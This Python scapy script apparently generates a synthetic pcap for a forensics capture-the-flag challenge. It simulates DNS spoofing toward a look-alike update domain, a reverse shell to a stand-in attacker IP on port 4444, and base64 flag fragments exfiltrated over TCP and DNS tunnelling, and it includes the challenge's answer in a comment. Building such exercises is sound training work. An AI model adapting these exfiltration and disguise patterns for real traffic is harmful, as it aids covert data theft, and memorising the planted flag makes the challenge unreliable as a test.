from scapy.all import *
import base64

victim_ip = "10.10.10.50"
attacker_ip = "10.10.10.99"
dns_server = "8.8.8.8"
packets = []

# Legit traffic - camouflage
for domain in ["microsoft.com", "update.windows-checker.net", "defender-downloads.com"]:
    packets.append(IP(src=victim_ip, dst=dns_server)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname=domain)))

# Real payload (malicious) under disguise
packets.append(IP(src=victim_ip, dst=dns_server)/UDP(sport=3000, dport=53)/DNS(rd=1, qd=DNSQR(qname="cdn.windowsupdate-check.net")))
packets.append(IP(src=dns_server, dst=victim_ip)/UDP(sport=53, dport=3000)/DNS(qr=1, aa=1, qd=DNSQR(qname="cdn.windowsupdate-check.net"), an=DNSRR(rrname="cdn.windowsupdate-check.net", rdata=attacker_ip)))

# TCP download - pretend it's a telemetry file
packets.append(IP(src=victim_ip, dst=attacker_ip)/TCP(sport=2222, dport=80, flags="PA")/Raw(load="GET /telemetry/sync_data.js HTTP/1.1\r\nHost: cdn.windowsupdate-check.net\r\n\r\n"))
packets.append(IP(src=attacker_ip, dst=victim_ip)/TCP(sport=80, dport=2222, flags="PA")/Raw(load="HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n// legit update"))


# === Reverse shell with fake decoys ===
packets += [
    IP(src=victim_ip, dst=attacker_ip)/TCP(sport=3333, dport=4444, flags="S"),
    IP(src=attacker_ip, dst=victim_ip)/TCP(sport=4444, dport=3333, flags="SA"),
    IP(src=victim_ip, dst=attacker_ip)/TCP(sport=3333, dport=4444, flags="A")
]

# Legit base64-like commands + one real
commands = [
    ("echo RkFLRV9GTEFHX0hFUkU=", "fake_flag_123"),
    ("echo ZmxhZ3tSRVBBSVJFRH0=", "flag{REPAIRED}"),  # real flag
    ("echo SElERU5fRkxBRw==", "nothing_here")
]

for cmd, resp in commands:
    packets.append(IP(src=victim_ip, dst=attacker_ip)/TCP(sport=3333, dport=4444, flags="PA")/Raw(load=cmd))
    packets.append(IP(src=attacker_ip, dst=victim_ip)/TCP(sport=4444, dport=3333, flags="PA")/Raw(load=resp))

# === Split flag across multiple packets ===
flag_fragments = ["ZmxhZw==", "e1JFUEFJ", "UkVEfQ=="]  # base64 parts of flag
for part in flag_fragments:
    packets.append(IP(src=victim_ip, dst=attacker_ip)/TCP(sport=4445, dport=8080, flags="PA")/Raw(load=base64.b64encode(part.encode()).decode()))

# === Double-encoded DNS tunneling ===
dns_fragments = [
    base64.b64encode(b"ZmxhZw==").decode(),
    base64.b64encode(b"e1JFUEFJ").decode(),
    base64.b64encode(b"UkVEfQ==").decode()
]

for i, encoded in enumerate(dns_fragments):
    domain = f"s{i}.{encoded}.windowsupdate-check.net"
    packets.append(IP(src=victim_ip, dst=dns_server)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname=domain)))

# Save
wrpcap("hardened_optimize_repair_exfil.pcap", packets)
